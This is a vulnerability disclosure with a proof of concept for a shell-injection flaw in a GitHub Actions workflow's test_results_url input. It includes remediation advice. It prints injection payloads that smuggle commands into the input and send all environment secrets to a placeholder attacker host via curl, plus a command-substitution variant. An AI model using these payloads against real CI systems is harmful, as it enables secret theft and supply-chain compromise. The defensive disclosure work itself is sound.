# PoC-001: CI/CD Script Injection via `test_results_url` Input

## Vulnerability

**File:** `.github/workflows/l0-test.yml`
**Line:** 56
**Severity:** CRITICAL
**CWE:** CWE-78 (OS Command Injection), CWE-74 (Injection)

## Description

The `l0-test.yml` GitHub Actions workflow accepts a `test_results_url` input via
`workflow_dispatch` and interpolates it **unsanitized** directly into a shell `run:` step:

```yaml
# .github/workflows/l0-test.yml:56
- name: Collect test result
  run: rm -rf results && mkdir results && cd results && curl --user svc_tensorrt:${{ secrets.ARTIFACTORY_TOKEN }} -L ${{ github.event.inputs.test_results_url }} | tar -xz
```

When GitHub Actions expands `${{ github.event.inputs.test_results_url }}`, the value is
substituted verbatim into the shell command **before** the shell parses it.  An attacker
who can trigger `workflow_dispatch` (any repository collaborator with write or triage
permissions, or anyone if the workflow allows it on public repos) can inject arbitrary
shell commands.

## Attack Surface

Anyone who can call `POST /repos/{owner}/{repo}/actions/workflows/{workflow_id}/dispatches`
via the GitHub API with a crafted `inputs.test_results_url`.

## Proof of Concept

### Step 1 — Trigger the workflow with injected payload

```bash
# Attacker has a GitHub PAT (write:repo or actions:write scope)
curl -X POST \
  -H "Authorization: Bearer <ATTACKER_PAT>" \
  -H "Accept: application/vnd.github+json" \
  https://api.github.com/repos/NVIDIA/TensorRT-LLM/actions/workflows/l0-test.yml/dispatches \
  -d '{
    "ref": "main",
    "inputs": {
      "sha": "deadbeef",
      "test_results_url": "http://evil.example.com/x.tar.gz; env | curl -s -d @- http://attacker.example.com/exfil #"
    }
  }'
```

### Step 2 — What the runner actually executes

After GitHub Actions expands the template, the shell receives:

```bash
rm -rf results && mkdir results && cd results && \
  curl --user svc_tensorrt:<ARTIFACTORY_TOKEN> -L \
  http://evil.example.com/x.tar.gz; \
  env | curl -s -d @- http://attacker.example.com/exfil \
  # | tar -xz
```

The `;` ends the first command.  The injected `env | curl …` runs unconditionally and
exfiltrates **all environment variables** — including `secrets.ARTIFACTORY_TOKEN` — to an
attacker-controlled server.  The trailing `#` turns the rest of the line into a comment
so tar never errors out.

### Step 3 — Safer but equally effective alternative (no special chars needed)

```
test_results_url: "$(env | curl -s -d @- http://attacker.example.com/exfil)"
```

When the shell evaluates this, `$(…)` is executed as a command substitution,
achieving the same result without needing semicolons.

### Step 4 — Demonstration safe payload (non-destructive)

```bash
# Safe payload: just writes a marker file to prove execution
test_results_url: "http://example.com/x $(touch /tmp/pwned_poc001) #"
```

After the workflow run, `/tmp/pwned_poc001` will exist on the runner.

## Impact

1. **Secret exfiltration:** `ARTIFACTORY_TOKEN` and any other secrets available in the
   job environment are leaked.
2. **Runner compromise:** Arbitrary commands execute with the runner's identity,
   allowing lateral movement to internal NVIDIA infrastructure.
3. **Supply chain attack:** The runner can be used to tamper with build artifacts,
   push malicious packages, or alter test results.
4. **ARTIFACTORY_TOKEN** is used with `svc_tensorrt` service account — compromise of
   this token allows downloading, replacing, or poisoning internal packages.

## Root Cause

GitHub Actions `${{ … }}` context expressions are **string interpolation**, not safe
variable expansion.  When placed in a `run:` block they are substituted before the shell
sees the string, making them equivalent to unquoted user input in a shell script.

## Remediation

**Option A — Environment variable indirection (recommended):**

```yaml
- name: Collect test result
  env:
    TEST_RESULTS_URL: ${{ github.event.inputs.test_results_url }}
  run: |
    # Validate URL format before use
    if [[ ! "$TEST_RESULTS_URL" =~ ^https://urm\.nvidia\.com/ ]]; then
      echo "ERROR: test_results_url must point to urm.nvidia.com" >&2
      exit 1
    fi
    rm -rf results && mkdir results && cd results
    curl --netrc-file /etc/curl-netrc -L "$TEST_RESULTS_URL" | tar -xz
```

**Option B — Pin to an allowlist:**

```yaml
inputs:
  test_results_url:
    description: 'Artifactory path suffix (e.g. trtllm-results/build-123.tar.gz)'
    required: true
# In run step:
run: |
  BASE="https://urm.nvidia.com/artifactory/sw-tensorrt-generic/"
  curl --user svc_tensorrt:"$ARTIFACTORY_TOKEN" -L "${BASE}${TEST_RESULTS_URL}" | tar -xz
```

**Additionally:** Replace `curl --user user:$TOKEN` with a header-based approach:

```bash
curl -H "Authorization: Bearer ${ARTIFACTORY_TOKEN}" ...
```

This prevents the token from appearing in process lists.

## References

- [GitHub Security Lab: Script injection](https://securitylab.github.com/research/github-actions-untrusted-input/)
- [CWE-78](https://cwe.mitre.org/data/definitions/78.html)
- [GHSA-mfwh-5m23-j46w](https://github.com/advisories/GHSA-mfwh-5m23-j46w) (similar pattern)
